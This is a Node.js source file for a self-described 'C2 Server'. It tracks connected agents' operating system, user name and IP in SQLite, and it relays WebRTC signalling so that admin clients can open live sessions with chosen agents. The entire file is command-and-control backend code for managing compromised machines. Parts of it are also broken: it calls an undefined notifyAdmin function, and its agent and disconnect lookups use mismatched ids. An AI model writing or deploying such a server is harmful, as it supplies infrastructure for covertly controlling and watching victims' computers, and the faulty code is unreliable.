const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const sqlite3 = require('better-sqlite3');
const fs = require('fs');

// --- DATABASE SETUP ---
const DB_PATH = path.join(__dirname, 'c2.db');
const db = sqlite3(DB_PATH);

// Enable WAL mode for better performance
db.pragma('journal_mode = WAL');

logDB("Initializing Database...");

// Initialize Tables
db.exec(`
    CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        os TEXT,
        arch TEXT,
        user TEXT,
        ip TEXT,
        last_seen INTEGER,
        status TEXT DEFAULT 'Offline',
        created_at INTEGER DEFAULT (strftime('%s', 'now'))
    );
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        message TEXT,
        timestamp INTEGER DEFAULT (strftime('%s', 'now'))
    );
`);

logDB("Database initialized successfully.");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static(__dirname)); 

function logDB(msg) {
    const timestamp = Date.now();
    db.prepare("INSERT INTO logs (message) VALUES (?)").run(msg);
    console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);
}

wss.on('connection', (ws, req) => {
    let clientId = uuidv4().substr(0, 8);
    ws.id = clientId;
    ws.isAdmin = false;

    ws.on('message', (msgRaw) => {
        try {
            const data = JSON.parse(msgRaw);
            
            if (data.type === 'register_admin') {
                ws.isAdmin = true;
                ws.adminId = clientId;
                logDB(`[ADMIN] Connected via port ${req.socket.remotePort}`);
                notifyAdmin(clientId, "🛡️ Admin Session Started");
                broadcastToAdmins(ws, { type: 'refresh_users' });
                return;
            }

            if (data.type === 'info') {
                const uniqueId = data.uniqueId || data.id; 
                const now = Date.now();
                
                const stmt = db.prepare(`
                    INSERT INTO users (id, os, arch, user, ip, last_seen, status) 
                    VALUES (?, ?, ?, ?, ?, ?, 'Online')
                    ON CONFLICT(id) DO UPDATE SET 
                        last_seen = ?, 
                        status = 'Online',
                        os = COALESCE(excluded.os, os),
                        user = COALESCE(excluded.user, user),
                        ip = COALESCE(excluded.ip, ip)
                `);
                stmt.run(uniqueId, data.os, data.arch, data.user, data.ip, now, now);

                wss.clients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN && client.isAdmin) {
                        client.send(JSON.stringify({
                            type: 'user_update',
                            id: uniqueId,
                            info: data,
                            lastSeen: now
                        }));
                    }
                });
            }

            if (['offer', 'answer', 'candidate'].includes(data.type)) {
                if (ws.isAdmin && data.targetId) {
                    const targetWs = findAgentByUniqueID(data.targetId);
                    if (targetWs && targetWs.readyState === WebSocket.OPEN) {
                        targetWs.send(JSON.stringify(data));
                    }
                } 
                else if (!ws.isAdmin && data.targetId === 'admin') {
                    wss.clients.forEach(client => {
                        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
                            client.send(JSON.stringify(data));
                        }
                    });
                }
            }
        } catch (e) {
            logDB(`[ERR] Message parsing error: ${e.message}`);
        }
    });

    ws.on('close', () => {
        db.prepare("UPDATE users SET status = 'Offline', last_seen = ? WHERE id = ?")
           .run(Date.now(), ws.id);
        logDB(`[-] Client Disconnected: ${ws.id}`);
        
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN && client.isAdmin) {
                client.send(JSON.stringify({ type: 'refresh_users' }));
            }
        });
    });
});

function findAgentByUniqueID(uniqueId) {
    for (const client of wss.clients) {
        if (client.id === uniqueId) return client;
    }
    return null;
}

function broadcastToAdmins(sender, msg) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify(msg));
        }
    });
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    logDB(`C2 Server running on port ${PORT}`);
});
